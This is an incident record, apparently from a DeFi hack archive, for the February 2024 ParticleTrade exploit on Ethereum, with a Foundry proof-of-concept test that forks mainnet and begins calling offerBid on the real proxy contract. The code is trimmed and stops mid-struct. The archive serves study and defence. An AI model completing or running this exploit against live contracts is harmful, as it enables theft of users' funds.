# [?] ParticleTrade - lack of validation data

## Summary
Severity: Unknown
Chain: Ethereum
Component: ParticleTrade
Published: 2024-02-16
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/ParticleTrade_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~50k
References:
- https://twitter.com/Phalcon_xyz/status/1758028270770250134

```solidity
contract ContractTest is Test {
    address zero = 0x0000000000000000000000000000000000000000;
    IParticleExchange proxy = IParticleExchange(0x7c5C9AfEcf4013c43217Fb6A626A4687381f080D);
    address Azuki = 0xB6a37b5d14D502c3Ab0Ae6f3a0E058BC9517786e;
    address Reservoir = 0xC2c862322E9c97D6244a3506655DA95F05246Fd8;
    address ParticleExchange = 0xE4764f9cd8ECc9659d3abf35259638B20ac536E4;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    address ownerofaddr = address(proxy);

    function setUp() public {
        cheats.createSelectFork("mainnet", 19_231_445);
        cheats.label(address(proxy), "proxy");
        cheats.label(address(Azuki), "Azuki");
        cheats.label(address(ParticleExchange), "ParticleExchange");
        cheats.label(address(Reservoir), "Reservoir");
    }

    function testExploit() public {
        payable(zero).transfer(address(this).balance);
        emit log_named_decimal_uint("Attacker Eth balance before attack:", address(this).balance, 18);
        uint256 tokenId = 50_126_827_091_960_426_151;
        uint256 tokenId2 = 19_231_446;
        (uint256 lienId) = proxy.offerBid(address(this), uint256(0), uint256(0), uint256(0));
        IParticleExchange.Lien memory lien = IParticleExchange.Lien({
            lender: zero,
            borrower: address(this),
            collection: address(this),
            tokenId: 0,
            price: 0,
            rate: 0,
            loanStartTime: 0,
            auctionStartTime: 0
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/ParticleTrade_exp.sol_
